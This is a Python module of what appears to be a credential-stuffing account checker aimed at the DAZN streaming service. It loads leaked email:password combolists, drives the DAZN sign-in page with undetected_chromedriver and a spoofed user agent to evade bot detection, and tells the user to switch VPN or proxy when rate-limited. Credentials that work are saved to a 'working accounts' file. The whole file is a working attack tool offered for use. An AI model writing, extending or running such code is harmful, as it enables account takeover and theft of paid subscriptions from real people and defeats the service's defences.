import time
import os
from services.chrome_version import GetChromeVersionForCurrentOS
from combo_splitters.split_combos import ComboSplitter
from titles.dazn_title import title
from selenium.common.exceptions import SessionNotCreatedException
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.common.exceptions import InvalidSessionIdException
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as webdriver
from pathlib import Path

chrome_version = GetChromeVersionForCurrentOS()


def dazn():
    title()
    file_directory = str(Path(__file__).parents[1]) + '/combolists/dazn'
    page = 'https://www.dazn.com/signin'
    plain_directory = str(Path(__file__).parents[1])
    error_flag = False
    splitter = ComboSplitter(file_directory, "dazn")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error(plain_directory + "/combolists")
        exit()
    index = 0
    while index != len(users):
        os.makedirs('accounts', exist_ok=True)
        with open(plain_directory + '/accounts/dazn_working_accounts', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                browser_options = Options()
                browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                                             '(KHTML, like Gecko) Chrome/{} Safari/537.36'.format(chrome_version))
                browser = webdriver.Chrome(options=browser_options, version_main=138)
                browser.set_window_size(500, 700)
                browser.get(page)
                time.sleep(20)
                if browser.find_elements(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]'):
                    gdpr_accept_all_button = browser.find_element(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]')
                    gdpr_accept_all_button.click()
                    time.sleep(8)
                email_input_box = browser.find_element(By.XPATH, '//input[@id="email"]')
                email_input_box.send_keys(users[index])
                time.sleep(3)
                sign_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
                sign_in_button.click()
                time.sleep(10)
                password_input_box = browser.find_element(By.XPATH, '//input[@id="password"]')
                password_input_box.send_keys(passwords[index])
                log_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
                log_in_button.click()
                log_in_button.click()
                time.sleep(10)
                if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div'):
                    four_two_nine = browser.find_element(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div').text
                    if 'Too many attempts' in four_two_nine:
                        print(" | {}:{} ---> 429 - Too many attempts\nPlease change your VPN/Proxy and try again."
                              .format(users[index], passwords[index]))
                        print("Ending.")
                        exit()
                if "home" in browser.current_url:
                    print(' | {}:{} ---> Success!'.format(users[index], passwords[index]))
                    account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
                else:
                    print(' | {}:{} ---> Invalid Credentials'.format(users[index], passwords[index]))
                index += 1
                browser.close()
            except ElementClickInterceptedException:
                print(' | Click Intercepted, iteration index was not incremented.')

            except NoSuchElementException:
                print(' | Element hidden, iteration index was not incremented.')

            except InvalidSessionIdException as e:
                print('Session terminated unexpectedly.\n')
                print('DebugInfo: {}\n'.format(e.msg))
                break
            except SessionNotCreatedException as e:
                print('\nSession not created (probably undetected Chromedriver). Wait a moment and try again.\n')
                print('\nIf debug shows a message about conflicting Chromedriver/Chrome version:\n')
                print('\n1) Check both versions.\n')
                print('\n2) If they match, this is a known undetected Chromedriver bug.\n')
                print('(Debug: {})'.format(e.msg))
                break

